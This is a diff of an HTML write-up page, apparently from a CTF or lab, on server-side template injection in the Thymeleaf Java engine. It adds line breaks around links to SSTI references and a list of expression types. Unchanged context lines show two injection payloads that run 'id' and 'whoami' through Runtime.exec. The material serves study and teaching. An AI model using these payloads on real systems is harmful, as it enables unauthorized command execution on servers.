@@ -117,16 +117,17 @@ This a modern server-side Java template engine for both web and standalone envir
 <h4 id="find-out-about-this-template-engine">Find out about this Template-Engine</h4>
 <p>Assuming <strong>Thymeleaf</strong> as a template engine , we can think about a <em><strong>Server-side template injection</strong></em>.
 So searching about SSTI on this template engine
-<strong>&raquo;</strong> <a href="https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/">https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/</a>
-<strong>&raquo;</strong> <a href="https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability">https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability</a>
-<strong>&raquo;</strong> <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#thymeleaf-java">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#thymeleaf-java</a></p>
+
+<br><strong>&raquo;</strong> <a href="https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/">https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/</a>
+<br><strong>&raquo;</strong> <a href="https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability">https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability</a>
+<br><strong>&raquo;</strong> <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#thymeleaf-java">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#thymeleaf-java</a></p>
 <h4 id="exploitation">Exploitation</h4>
 <p>To attempt an SSTI in Thymeleaf, we first must understand expressions that appear in Thymeleaf attributes. Thymeleaf expressions can have the following types:</p>
-<p><code>${...}</code>: Variable expressions – in practice, these are OGNL or Spring EL expressions.
-<code>*{...}</code>: Selection expressions – similar to variable expressions but used for specific purposes.
-<code>#{...}</code>: Message (i18n) expressions – used for internationalization.
-<code>@{...}</code>: Link (URL) expressions – used to set correct URLs/paths in the application.
-<code>~{...}</code>: Fragment expressions – they let you reuse parts of templates.</p>
+<br><p><code>${...}</code>: Variable expressions – in practice, these are OGNL or Spring EL expressions.
+<br><code>*{...}</code>: Selection expressions – similar to variable expressions but used for specific purposes.
+<br><code>#{...}</code>: Message (i18n) expressions – used for internationalization.
+<br><code>@{...}</code>: Link (URL) expressions – used to set correct URLs/paths in the application.
+<br><code>~{...}</code>: Fragment expressions – they let you reuse parts of templates.</p>
 <ul>
 <li><code>__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()}__::.x</code></li>
 <li><code>__${T(java.lang.Runtime).getRuntime().exec(&quot;whoami&quot;)}__::.x</code></li>
